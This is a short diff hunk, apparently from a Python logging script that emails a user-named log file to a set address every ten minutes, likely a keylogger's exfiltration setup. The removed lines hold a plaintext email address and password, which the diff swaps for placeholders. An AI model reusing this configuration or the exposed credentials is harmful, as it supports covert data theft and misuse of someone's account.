@@ -16,9 +16,9 @@ dirLog = 'log.txt'
 dirCopy = 'log%s.txt' %os.getlogin()
 
 #email 
-user = 'systemclear3@mail.ru'
-pwd = 'megamind123'
-recipient = 'systemclear3@mail.ru'
+user = 'yourmail'
+pwd = 'yourpassword'
+recipient = 'destination mail'
 #seconds that email with log file will be send
 delay = 600
 
